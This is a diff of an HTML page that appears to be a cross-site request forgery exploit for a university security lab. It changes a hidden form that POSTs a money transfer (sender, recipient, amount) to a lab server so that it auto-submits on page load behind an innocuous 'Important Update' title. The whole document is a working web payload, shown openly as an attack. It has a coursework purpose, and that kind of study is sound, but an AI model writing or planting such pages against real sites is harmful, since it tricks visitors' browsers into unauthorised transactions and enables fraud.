@@ -2,18 +2,20 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Helpful Article</title>
+    <title>Important Update</title>
 </head>
-<body>
-    <h1>Please wait, loading...</h1>
-    <form action="https://2372895.labs.csci3403.com/transaction" method="POST" id="csrf-form" style="display: none;">
+<body onload="document.getElementById('csrf-form').submit();">
+    <form action="https://2372895.labs.csci3403.com/transaction" method="POST" id="csrf-form" style="display:none;">
         <input type="hidden" name="sender" value="support" />
-        <input type="hidden" name="recipient" value="student" />
-        <input type="hidden" name="amount" value="100.00" />
-        <!-- Add any other necessary hidden fields that the request might require -->
+        <input type="hidden" name="recipient" value="your_username" />
+        <input type="hidden" name="amount" value="10.00" />
+        <!-- You might need to include other hidden fields that are part of the transaction request -->
     </form>
     <script>
-        document.getElementById('csrf-form').submit();
+        window.onload = function(){
+          document.getElementById('csrf-form').submit();
+        }
     </script>
 </body>
 </html>
+
